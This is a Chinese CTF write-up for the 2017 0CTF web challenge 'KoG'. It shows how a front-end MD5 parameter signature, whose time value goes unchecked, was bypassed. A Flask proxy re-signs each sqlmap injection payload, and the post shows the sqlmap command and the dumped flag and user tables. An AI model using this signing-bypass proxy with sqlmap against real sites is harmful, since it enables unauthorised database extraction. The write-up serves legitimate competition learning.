---
title: sqlmap代理绕过参数hash验证
date: 2017-03-19 22:33:36
categories: CTF
tags:
    - 0CTF
    - sqlmap
    - SQL注入
---

## 背景介绍

前端js对用户输入的参数进行加密，然后发送给服务器，服务器先验证合法性，然后才处理用户传入的参数，返回响应。这种方式并没有看起来的那么可靠，完全依赖前端的加密，服务器仅仅只进行验证工作，这是很不安全的，用户只需分析清楚前端的加密方式，然后利用这种加密方式加密数据，就可以伪造数据通过服务器的验证。

2017 0CTF一道Web题`KoG`就是这种情况, 前端js首先会验证用户输入的合法性，对合法的输入进行加密，服务端进行验证。若想绕过js的验证，可以通过更改js的代码，或者分析清楚js的加密方式，然后利用加密方式伪造数据。

<!-- more -->

## js加密方式解析

发送真正请求的方式为:

```js
var s = "api.php?id=" + args["id"] + "&hash=" + ar[0] + "&time=" + ar[1];
```

关键是hash内部是怎么加密的。对前端js进行调试，发现其加密方式为:

```
md5(d727d11f6d284a0d + id +  This_is_salt + time)
```

知道了hash加密的方式, 服务器根据id和time验证hash值是否正确，id为用户输入，关键看time服务器是否会验证，若time值服务器不验证则很容易伪造hash值，若服务器验证time,则需要知道time值是怎样来的，然后每次都要更新time值，所幸服务器没有验证time值，因此hash值是可以控制的了，剩下的就是对id的注入。

## id注入

说到sql注入，自然想到神器sqlmap，由于服务器进行了hash校验，直接使用sqlmap时不行的，那就写个代理服务器，对sqlmap每次注入的payload进行加密，然后再发送出去，这样就可以运用sqlmap的自动化能力了

* proxy.py

```python
# -*- coding: utf-8 -*-

import sys
from hashlib import md5

from flask import Flask
from flask import request
import requests


app = Flask(__name__)


def gen_hash(pid):
    data = "d727d11f6d284a0d{} This_is_salt1489821845".format(pid)
    return md5(data).hexdigest()


def get(pid):
    params = {
        'id': '',
        'hash': '',
        'time': '1489821845'
    }

    url = 'http://202.120.7.213:11181/api.php'

    params['id'] = pid
    params['hash'] = gen_hash(pid)
    resp = requests.get(url, params=params)
    return resp.content


@app.route('/')
def index():
    pid = request.args['id']
    return get(pid)


if __name__ == "__main__":
    app.run(debug=True)
```

运行代理服务器，再调用sqlmap: `sqlmap -u 'http://127.0.0.1:5000/?id=1' -p id --dbms=mysql --dump`

```
Database: 0ctf
Table: fl4g
[1 entry]
+---------------------------------+
| hey                             |
+---------------------------------+
| flag{emScripten_is_Cut3_right?} |
+---------------------------------+

[16:18:36] [INFO] table '`0ctf`.fl4g' dumped to CSV file '/Users/js/.sqlmap/output/127.0.0.1/dump/0ctf/fl4g.csv'
[16:18:36] [INFO] fetching columns for table 'user' in database '0ctf'
[16:18:36] [INFO] fetching entries for table 'user' in database '0ctf'
[16:18:36] [INFO] analyzing table dump for possible password hashes
Database: 0ctf
Table: user
[5 entries]
+----+----------------+
| id | name           |
+----+----------------+
| 1  | EaseSingle Qin |
| 2  | Short 5alt     |
| 3  | Married Ma     |
| 4  | Hansome Chen   |
| 5  | President Liu  |
+----+----------------+
```
